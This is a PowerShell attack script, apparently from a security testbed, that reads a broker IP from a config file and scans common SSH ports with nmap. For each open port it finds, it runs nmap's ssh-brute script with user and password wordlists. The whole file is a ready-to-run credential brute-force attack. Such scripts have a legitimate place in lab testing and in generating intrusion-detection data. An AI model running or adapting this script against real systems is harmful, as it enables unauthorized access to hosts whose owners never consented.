# ============================================================
# SSH Bruteforce via Nmap (Auto-Detect SSH Port Version)
# ============================================================

# Get folder of this script (attacks/)
$ScriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path

# Project root = parent of attacks/
$ProjectRoot = Split-Path $ScriptDir -Parent

# ------------------------------------------------------------
# Load network_config.json
# ------------------------------------------------------------
$ConfigPath = Join-Path $ProjectRoot "configs/network_config.json"

if (!(Test-Path $ConfigPath)) {
    Write-Host "[ERROR] Config file not found: $ConfigPath" -ForegroundColor Red
    exit
}

$NetConfig = Get-Content $ConfigPath | ConvertFrom-Json
$TARGET = $NetConfig.broker_ip

Write-Host "[INFO] Target IP from config: $TARGET" -ForegroundColor Cyan

# ------------------------------------------------------------
# Resolve paths to user/password dictionaries
# ------------------------------------------------------------
$USERS = Join-Path $ScriptDir "users.txt"
$PASSWORDS = Join-Path $ScriptDir "passwords.txt"

if (!(Test-Path $USERS)) {
    Write-Host "[ERROR] Missing users file: $USERS" -ForegroundColor Red
    exit
}
if (!(Test-Path $PASSWORDS)) {
    Write-Host "[ERROR] Missing passwords file: $PASSWORDS" -ForegroundColor Red
    exit
}

Write-Host "[INFO] Loaded users.txt and passwords.txt" -ForegroundColor Green

# ------------------------------------------------------------
# Step 1: Scan common SSH ports
# ------------------------------------------------------------
$CommonSSHPorts = "22,2222,2200,2022,8022,222,9922,10022"

Write-Host "`n[SCAN] Checking common SSH ports on $TARGET ..." -ForegroundColor Yellow

$ScanOutput = nmap -sV -p $CommonSSHPorts $TARGET

# Extract any port with "open ssh"
$MatchedPorts = @()

foreach ($line in $ScanOutput) {
    if ($line -match "^[0-9]+/tcp\s+open\s+ssh") {
        if ($line -match "^([0-9]+)/tcp") {
            $MatchedPorts += $matches[1]
        }
    }
}

if ($MatchedPorts.Count -eq 0) {
    Write-Host "`n[INFO] No SSH service found on common ports." -ForegroundColor Red
    Write-Host "[DONE] Nothing to bruteforce." -ForegroundColor Cyan
    exit
}

Write-Host "`n[INFO] SSH Detected on: $($MatchedPorts -join ', ')" -ForegroundColor Green

# ------------------------------------------------------------
# Step 2: Run ssh-brute on each SSH port found
# ------------------------------------------------------------
foreach ($Port in $MatchedPorts) {

    Write-Host "`n[SSH Bruteforce] Running nmap ssh-brute on port $Port ..." -ForegroundColor Yellow

    nmap -p $Port --script ssh-brute `
        --script-args "userdb=$USERS,passdb=$PASSWORDS" `
        $TARGET
}

Write-Host "`n[DONE] SSH Bruteforce attack finished." -ForegroundColor Green
